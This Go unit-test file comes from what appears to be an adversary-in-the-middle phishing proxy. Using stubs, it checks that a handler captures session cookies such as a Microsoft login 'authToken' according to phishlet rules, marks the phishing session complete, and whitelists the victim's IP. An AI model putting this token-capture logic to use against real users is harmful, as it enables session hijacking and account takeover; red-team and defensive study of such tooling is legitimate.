package response_test

import (
	"net/http"
	"regexp"
	"testing"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
)

type stubSessionCompleter struct {
	updated          *aitm.Session
	completed        bool
	isCompleteResult bool // controls what IsComplete returns
	err              error
}

func (s *stubSessionCompleter) Update(sess *aitm.Session) error {
	s.updated = sess
	return s.err
}

func (s *stubSessionCompleter) Complete(_ *aitm.Session) error {
	s.completed = true
	return s.err
}

func (s *stubSessionCompleter) IsComplete(_ *aitm.Session, _ *aitm.Phishlet) bool {
	return s.isCompleteResult
}

type stubWhitelister struct{ ip string }

func (s *stubWhitelister) WhitelistTemporary(ip string, _ time.Duration) { s.ip = ip }

func TestTokenExtractor_CapturesCookieToken(t *testing.T) {
	sessions := &stubSessionCompleter{isCompleteResult: false}
	h := &response.TokenExtractor{
		Sessions: sessions,
		Logger:   discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Add("Set-Cookie", "authToken=secret; Domain=login.microsoft.com; Path=/")

	ctx := &aitm.ProxyContext{
		Session: &aitm.Session{ID: "sess-1"},
		Phishlet: &aitm.Phishlet{
			AuthTokens: []aitm.TokenRule{
				{Type: aitm.TokenTypeCookie, Name: regexp.MustCompile(`^authToken$`)},
			},
		},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sessions.updated == nil {
		t.Fatal("expected session to be updated after token capture")
	}
	if _, ok := ctx.Session.CookieTokens["login.microsoft.com"]["authToken"]; !ok {
		t.Errorf("expected authToken captured, got: %v", ctx.Session.CookieTokens)
	}
}

func TestTokenExtractor_NoPhishlet_Skips(t *testing.T) {
	sessions := &stubSessionCompleter{}
	h := &response.TokenExtractor{
		Sessions: sessions,
		Logger:   discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	resp.Header.Add("Set-Cookie", "tok=x; Path=/")

	if err := h.Handle(&aitm.ProxyContext{}, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sessions.updated != nil {
		t.Error("expected no store update when phishlet is nil")
	}
}

func TestTokenExtractor_SessionCompleted(t *testing.T) {
	sessions := &stubSessionCompleter{isCompleteResult: true}
	whitelister := &stubWhitelister{}
	h := &response.TokenExtractor{
		Sessions:  sessions,
		Whitelist: whitelister,
		Logger:    discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	ctx := &aitm.ProxyContext{
		ClientIP: "1.2.3.4",
		Session:  &aitm.Session{ID: "sess-1"},
		Phishlet: &aitm.Phishlet{},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !sessions.completed {
		t.Error("expected Complete to be called on session completion")
	}
	if whitelister.ip != "1.2.3.4" {
		t.Errorf("expected IP 1.2.3.4 to be whitelisted, got %q", whitelister.ip)
	}
}

func TestTokenExtractor_SessionCompleted_NilWhitelist(t *testing.T) {
	sessions := &stubSessionCompleter{isCompleteResult: true}
	h := &response.TokenExtractor{
		Sessions:  sessions,
		Whitelist: nil, // no whitelist configured — must not panic
		Logger:    discardLogger(),
	}
	resp := newResp(http.StatusOK, "text/html", "")
	ctx := &aitm.ProxyContext{
		ClientIP: "1.2.3.4",
		Session:  &aitm.Session{ID: "sess-1"},
		Phishlet: &aitm.Phishlet{},
	}

	if err := h.Handle(ctx, resp); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !sessions.completed {
		t.Error("expected Complete to be called even with nil Whitelist")
	}
}
